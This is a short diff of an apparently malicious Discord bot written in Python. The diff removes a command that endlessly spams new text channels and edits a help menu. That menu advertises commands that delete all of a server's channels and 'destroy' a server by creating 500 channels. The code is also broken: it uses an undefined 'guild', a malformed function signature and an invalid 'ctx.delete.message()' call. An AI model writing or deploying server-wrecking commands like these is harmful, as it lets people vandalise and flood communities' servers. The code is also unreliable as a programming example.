@@ -69,21 +69,11 @@ async def cda(ctx):
         except:
             pass   
 
-@client.command()
-async def cc(ctx, *,l ,message):
-    members=ctx.guild.members
-    await ctx.message.delete()
-    
-    for i in range(l):
-        await guild.create_text_channel(f"{message}")
-    while True:
-        for channel in guild.text_channels:
-            for i in range (l):
-                await guild.create_text_channel(f"{message}")
- 
 
 @client.command()
 async def commands(ctx):
+  
+  await ctx.delete.message()
   embed=discord.Embed(title="Commands",timestamp= ctx.message.created_at,color=discord.Color.blue(),inline=False)
   embed.add_field(name="**.cda**",value="cda command for deleting all channels only", inline=False)
   embed.add_field(name="**.destroy (message)**",value="destroy command for deleting all and creating 500 channels ",inline=False)
